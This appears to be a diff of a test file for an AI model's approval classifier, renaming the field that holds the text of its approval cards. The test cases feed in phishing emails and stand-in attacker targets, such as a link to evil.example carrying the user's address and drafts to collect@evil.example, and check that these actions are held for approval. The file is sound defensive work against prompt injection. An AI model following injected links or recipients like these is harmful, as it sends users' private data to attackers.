@@ -214,7 +214,7 @@ describe('sends and guest changes ask every time, with only Allow and Not now', 
   it('asks before creating a calendar event with a guest, and never offers the chat-wide answer', async () => {
     const decision = await classifyTier(calendarCreate(['dana@example.org']), makeCtx());
     expect(decision).toMatchObject({ tier: 3, reason: 'calendar_write_guests' });
-    expect(decision.card?.plain_what).toContain(
+    expect(decision.card?.plain_reason).toContain(
       'This change sends an invitation to other people, so Aman always asks.',
     );
     expect(
@@ -233,7 +233,7 @@ describe('sends and guest changes ask every time, with only Allow and Not now', 
     const ctx = makeCtx();
     ctx.web_search.assistantName = 'Mannie';
     const decision = await classifyTier(calendarCreate(['dana@example.org']), ctx);
-    expect(decision.card?.plain_what).toContain('so Mannie always asks.');
+    expect(decision.card?.plain_reason).toContain('so Mannie always asks.');
   });
 
   it('still lets the chat-wide answer cover saving a draft, which sends nothing', async () => {
@@ -262,8 +262,9 @@ describe('what is held, because content steered it', () => {
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: PHISH });
     const decision = await classifyTier(openPage('http://evil.example/?u=sam.rivers@example.com'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_steered' });
-    expect(decision.card?.plain_what).toBe(
-      'Open http://evil.example/?u=sam.rivers@example.com? Aman found this link in something it read, and opening it would send more than the link said.',
+    expect(decision.card?.plain_what).toBe('Open http://evil.example/?u=sam.rivers@example.com?');
+    expect(decision.card?.plain_reason).toBe(
+      'Aman found this link in something it read, and opening it would send more than the link said.',
     );
   });
 
@@ -278,8 +279,8 @@ describe('what is held, because content steered it', () => {
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: PHISH });
     const decision = await classifyTier(sendDraft(draft({ to: [{ name: '', address: 'collect@evil.example' }] })), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'content_steered' });
-    expect(decision.card?.plain_what).toMatch(
-      / This goes to collect@evil\.example, whose address was in an email Aman read\.$/,
+    expect(decision.card?.plain_reason).toMatch(
+      /^This goes to collect@evil\.example, whose address was in an email Aman read\.$/,
     );
     expect(
       allowsChatApproval({
@@ -312,8 +313,8 @@ describe('what is held, because content steered it', () => {
       ctx,
     );
     expect(forward).toMatchObject({ tier: 3, reason: 'content_steered' });
-    expect(forward.card?.plain_what).toMatch(
-      / This goes to records@collector\.example, whose address was in an email Aman read\.$/,
+    expect(forward.card?.plain_reason).toMatch(
+      /^This goes to records@collector\.example, whose address was in an email Aman read\.$/,
     );
     expect(allowsChatApproval(gmailInfo('send_draft', forward.reason))).toBe(false);
   });
@@ -384,8 +385,8 @@ describe('what is held, because content steered it', () => {
       ctx,
     );
     expect(decision).toMatchObject({ tier: 3, reason: 'content_steered' });
-    expect(decision.card?.plain_what).toMatch(
-      / This goes to Account Desk \(desk@billing-alerts\.example\), who sent the email Mannie just read\.$/,
+    expect(decision.card?.plain_reason).toMatch(
+      /^This goes to Account Desk \(desk@billing-alerts\.example\), who sent the email Mannie just read\.$/,
     );
     expect(decision.card?.plain_what).not.toMatch(/Aman|—/);
   });
@@ -402,8 +403,8 @@ describe('what is held, because content steered it', () => {
       sendDraft(draft({ to: [{ name: 'Vendor Sales', address: 'sales@vendor.example' }] })),
       ctx,
     );
-    expect(decision.card?.plain_what).toMatch(
-      / This goes to Vendor Sales \(sales@vendor\.example\), whose address was in a page Mannie read\.$/,
+    expect(decision.card?.plain_reason).toMatch(
+      /^This goes to Vendor Sales \(sales@vendor\.example\), whose address was in a page Mannie read\.$/,
     );
   });
 
@@ -414,8 +415,8 @@ describe('what is held, because content steered it', () => {
       sendDraft(draft({ to: [{ name: '', address: 'billing@supplier.example' }] })),
       ctx,
     );
-    expect(decision.card?.plain_what).toMatch(
-      / This goes to billing@supplier\.example, whose address was in a file Aman read\.$/,
+    expect(decision.card?.plain_reason).toMatch(
+      /^This goes to billing@supplier\.example, whose address was in a file Aman read\.$/,
     );
     expect(allowsChatApproval(gmailInfo('send_draft', decision.reason))).toBe(false);
   });
@@ -424,7 +425,7 @@ describe('what is held, because content steered it', () => {
     const key = ['AKI', 'A', 'ABCDEFGH', 'IJKLMNOP'].join('');
     const decision = await classifyTier(search(`what is ${key}`), makeCtx());
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_guard' });
-    expect(decision.card?.plain_what).toMatch(/This sends something that looks like a password or key\.$/);
+    expect(decision.card?.plain_reason).toMatch(/This sends something that looks like a password or key\.$/);
   });
 
   it('holds a search that carries a key this computer keeps, and never shows it', async () => {
@@ -439,8 +440,8 @@ describe('what is held, because content steered it', () => {
     ctx.web_search.assistantName = 'Mannie';
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: PHISH });
     const decision = await classifyTier(openPage('http://evil.example/?u=sam'), ctx);
-    expect(decision.card?.plain_what).toContain('Mannie found this link in something it read');
-    expect(decision.card?.plain_what).not.toContain('Aman');
+    expect(decision.card?.plain_reason).toContain('Mannie found this link in something it read');
+    expect(decision.card?.plain_reason).not.toContain('Aman');
     expect(decision.card?.plain_what).not.toMatch(/—/);
   });
 });
@@ -473,8 +474,9 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
     const decision = await classifyTier(search('dana@example.org'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
-    expect(decision.card?.plain_what).toBe(
-      'Search the web for dana@example.org? This would send a private detail of yours, in a chat where Aman has read things written by other people, so Aman is checking with you first.',
+    expect(decision.card?.plain_what).toBe('Search the web for dana@example.org?');
+    expect(decision.card?.plain_reason).toBe(
+      'This would send a private detail of yours, in a chat where Aman has read things written by other people, so Aman is checking with you first.',
     );
   });
 
@@ -483,7 +485,7 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
     const decision = await classifyTier(openPage('https://directory.example/lookup?email=dana@example.org'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
-    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+    expect(decision.card?.plain_reason).toContain('This would send a private detail of yours');
   });
 
   it("asks before opening a page whose link carries an address from the person's mail in the link's own spelling", async () => {
@@ -491,7 +493,7 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
     const decision = await classifyTier(openPage('https://directory.example/lookup?email=dana%40example.org'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
-    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+    expect(decision.card?.plain_reason).toContain('This would send a private detail of yours');
   });
 
   it("asks before a search that carries an address from the person's mail, written with spaces as people write it", async () => {
@@ -499,7 +501,7 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
     const decision = await classifyTier(search('dana @example.org'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
-    expect(decision.card?.plain_what).toContain('This would send a private detail of yours');
+    expect(decision.card?.plain_reason).toContain('This would send a private detail of yours');
   });
 
   it("asks before a search that carries the person's phone number from their mail, written another way", async () => {
